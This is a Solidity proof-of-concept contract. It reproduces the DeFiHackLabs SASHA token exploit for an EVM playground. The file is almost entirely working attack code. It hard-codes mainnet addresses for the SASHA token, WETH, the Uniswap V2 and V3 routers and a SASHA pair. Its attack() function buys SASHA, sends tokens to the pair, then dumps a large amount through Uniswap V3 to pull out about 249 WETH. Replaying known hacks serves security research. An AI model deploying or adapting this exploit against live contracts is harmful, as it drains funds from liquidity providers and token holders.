// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Standalone reproduction for the EVM Playground — mirrors the DeFiHackLabs
// SASHAToken_exp.sol test's SASHAToken_AttackContract.attack() logic verbatim,
// without the outer Test harness (no forge-std dependency). The playground's
// `setup` block replicates the test's `payable(address(attackC)).transfer(0.08 ether)`
// pre-funding step, and `profitReceiver: "exploit"` + native-ETH profit scoring
// replicate the test's final `attacker.balance` check without needing a
// separate `withdraw()` call.

address constant SASHA = 0xD1456D1b9CEb59abD4423a49D40942a9485CeEF6;
address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant UniswapV2_Router2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant UniswapV3_Router2 = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;
address constant UniswapV2_SASHA21 = 0xB23FC1241e1Bc1a5542a438775809d38099838fe;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function approve(address spender, uint256 amount) external returns (bool);
}

interface Uni_Router_V2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface UniswapV3Router {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

contract SASHAToken_AttackContract {
    address payable public attacker;

    constructor() {
        attacker = payable(msg.sender);
    }

    function attack() public {
        // Approve
        IWETH(payable(weth)).approve(UniswapV2_Router2, type(uint256).max);
        IERC20(SASHA).approve(UniswapV2_Router2, type(uint256).max);
        IERC20(SASHA).approve(UniswapV3_Router2, type(uint256).max);

        // Deposit
        IWETH(payable(weth)).deposit{value: 0.07 ether}();

        // Swap
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = SASHA;
        Uni_Router_V2(UniswapV2_Router2).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            70_000_000_000_000_000, // amountIn
            1, // amountOutMin
            path, // path
            address(this), // to
            4_324_324_234_244 // deadline
        );

        IERC20(SASHA).transfer(UniswapV2_SASHA21, 1_000_000_000_000_000_000);

        UniswapV3Router.ExactInputSingleParams memory params = UniswapV3Router.ExactInputSingleParams({
            tokenIn: SASHA,
            tokenOut: weth,
            fee: 10_000,
            recipient: address(this),
            amountIn: 99_000_000_000_000_000_000_000,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });

        UniswapV3Router(UniswapV3_Router2).exactInputSingle(params);

        IWETH(payable(weth)).withdraw(249_276_511_929_373_786_924);
    }

    fallback() external payable {}
}
